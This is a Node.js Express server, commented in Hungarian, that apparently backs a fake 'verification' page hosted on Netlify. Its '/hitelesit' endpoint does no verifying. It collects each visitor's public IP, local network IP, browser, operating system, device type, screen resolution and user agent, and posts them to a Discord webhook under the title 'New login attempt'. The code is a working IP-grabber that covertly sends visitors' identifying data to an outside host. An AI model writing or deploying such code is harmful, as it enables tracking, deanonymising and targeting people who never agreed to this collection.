const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

// ====================== CORS BEÁLLÍTÁS ======================
app.use(cors({
    origin: [
        'https://hitelesites.netlify.app',
        'https://*.netlify.app',
        'http://localhost:3000',
        'http://127.0.0.1:5500',
        'http://localhost:5500'
    ],
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type'],
    optionsSuccessStatus: 204
}));

app.options('*', cors());
app.use(express.json({ limit: '10kb' }));

const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;

// ====================== SEGÉDFÜGGVÉNYEK ======================
const getClientIP = (req) => {
    return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip || 'Ismeretlen')
        .split(',')[0].trim();
};

const parseUA = (ua) => {
    if (!ua) return { browser: "Ismeretlen", os: "Ismeretlen", device: "Ismeretlen" };
    
    let browser = "Ismeretlen";
    let os = "Ismeretlen";
    let device = "Desktop";

    // Böngésző
    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
    else if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
    else if (ua.includes("Edg")) browser = "Edge";
    else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";

    // Operációs rendszer
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) { os = "Android"; device = "Mobile"; }
    else if (ua.includes("iPhone") || ua.includes("iPad")) { os = "iOS"; device = "Mobile"; }

    if (ua.includes("Mobile") || ua.includes("Android") || ua.includes("iPhone")) device = "Mobile";

    return { browser, os, device };
};

// ====================== FŐ ENDPOINT ======================
app.post('/hitelesit', async (req, res) => {
    try {
        const { ua, res: resolution, localIP } = req.body;
        const publicIP = getClientIP(req);
        const parsed = parseUA(ua);

        await axios.post(WEBHOOK, {
            embeds: [{
                title: "✅ Új Belépési Kísérlet",
                color: 0x00FF41,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "Publikus IP", value: publicIP, inline: true },
                    { name: "Privát IP (LAN)", value: localIP || "Nem található", inline: true },
                    { name: "Eszköz", value: parsed.device, inline: true },
                    { name: "Operációs Rendszer", value: parsed.os, inline: true },
                    { name: "Böngésző", value: parsed.browser, inline: true },
                    { name: "Képernyőfelbontás", value: resolution || "Nincs adat", inline: true },
                    { 
                        name: "User Agent", 
                        value: ua ? ua.substring(0, 400) + (ua.length > 400 ? "..." : "") : "Nincs adat",
                        inline: false 
                    }
                ]
            }]
        });

        res.status(200).json({ status: "OK" });
    } catch (error) {
        console.error('Webhook hiba:', error.message);
        res.status(500).json({ error: "Szerver hiba" });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.status(200).json({ status: 'OK', uptime: process.uptime() });
});

// ====================== SZERVER INDÍTÁS ======================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Szerver fut a ${PORT}-es porton`);
    if (!WEBHOOK) {
        console.error('❌ FIGYELMEZTETÉS: DISCORD_WEBHOOK_URL nincs beállítva!');
    }
});
